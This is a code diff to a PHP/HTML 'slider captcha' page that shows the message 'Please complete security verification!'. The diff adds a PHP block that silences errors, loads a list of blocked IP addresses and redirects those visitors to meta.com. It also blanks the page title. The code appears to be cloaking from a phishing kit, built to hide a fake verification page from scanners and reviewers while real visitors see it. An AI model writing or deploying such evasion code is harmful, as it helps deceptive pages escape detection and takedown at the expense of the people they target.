@@ -1,3 +1,26 @@
+<?php
+error_reporting(0); // Turn off all error reporting
+ini_set('display_errors', 0); // Disable error display
+ob_start(); // Start output buffering
+require 'check_ip.php';
+
+// Get and discard the output
+ob_get_clean();
+
+
+$clientIP = $_SERVER['REMOTE_ADDR'];
+
+if (in_array($clientIP, $blockedIPs)) {
+    ob_start(); // Start buffering the output
+    // You can put any echo statements or content here, but they won't be shown to the user
+    ob_end_clean(); // Discard the buffered output and don't display it
+    header("Location: https://meta.com");
+    exit;
+} else {
+    // The rest of your code here
+}
+?>
+<!DOCTYPE html>
 <html lang="en"><head>
   <meta charset="UTF-8">
   
@@ -13,7 +36,7 @@
 
 
   
-  <title>Slider captcha verification</title>
+  <title> </title>
      <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
   
@@ -204,7 +227,7 @@ body{
     document.addEventListener('DOMContentLoaded', function () {
       const cardHeader = document.querySelector('.card-header span');
       const randomString = generateRandomString(7); // Change 10 to your desired text length
-      cardHeader.textContent = `Please complete security verification! ID: ${randomString}`;
+      cardHeader.textContent = `Please complete security verification! #${randomString}`;
     });
   </script>
   
@@ -225,7 +248,7 @@ body{
         <div class="col-md-4 mb-5">
           <div class="slidercaptcha card">
                     <div class="card-header">
-                        <span>Please complete security verification! ID: RandomString</span>
+                        <span>Please complete security verification!</span>
                     </div>
                     <div class="card-body">
                         <div id="captcha" style="position: relative; width: 280px; margin: 0px auto;"><script src="script.js"></script></div></div></div>
